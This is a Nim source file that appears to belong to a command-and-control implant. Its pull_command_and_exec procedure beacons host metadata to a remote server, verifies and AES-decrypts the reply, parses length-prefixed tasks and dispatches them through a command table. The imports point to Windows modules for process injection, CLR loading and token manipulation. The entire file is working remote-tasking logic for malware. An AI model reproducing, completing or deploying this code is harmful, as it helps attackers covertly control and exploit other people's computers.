import std/[endians, tables]
import ../[meta, config, utils, crypt]
import ../transport/protocol
import types, fs, dns
when defined(windows):
    import windows/[process, exec, inject, job, clr, token, network]

proc pull_command_and_exec*() =
    var resp = send_request(meta_info_enc)
    if resp.len == 0: return

    # verify hamc hash
    var hmac_hash = resp[resp.len-hmac_key.len..<resp.len]
    if not verify_hmac_hash(hmac_hash): return
    var payload = resp[0..<resp.len-hmac_key.len]
    payload = aes_decrypt(payload)
    dbg "[+] payload: " & repr(payload)

    var timestamp = payload[0..<4]
    var temp4: array[4, byte]
    for i in 0..<4: temp4[i] = payload[4+i]
    var packet_len: int32
    bigEndian32(addr packet_len, addr temp4)
    var packet_buf = payload[8..^1]
    
    # parse cmd from packet
    while packet_len > 0:
        for i in 0..<4: temp4[i] = packet_buf[i]
        var cmd_type: command_type
        bigEndian32(addr cmd_type, addr temp4)

        for i in 0..<4: temp4[i] = packet_buf[4+i]
        var cmd_len: int32
        bigEndian32(addr cmd_len, addr temp4)

        var cmd_buf: seq[byte]
        #for i in 8..<packet_len: cmd_buf.add(packet_buf[i])
        dbg "[+] packet buf: " & repr(packet_buf) & "\n\tlen: " & repr(packet_buf.len)
        for i in 8..<8+cmd_len: cmd_buf.add(packet_buf[i])

        dbg "[+] command type: " & repr(cmd_type) & " - " & $cmd_len &
            "\n\tbuf in string: " & cmd_buf.toString &
            "\n\tbuf in bytes: " & repr(cmd_buf)

        if command_table.hasKey(cmd_type):
            command_table[cmd_type](cmd_buf, cmd_type)
        else:
            dbg "[-] couldn't find command: " & repr(cmd_type)

        packet_len -= cmd_len + 8
        packet_buf = packet_buf[cmd_len+8..^1]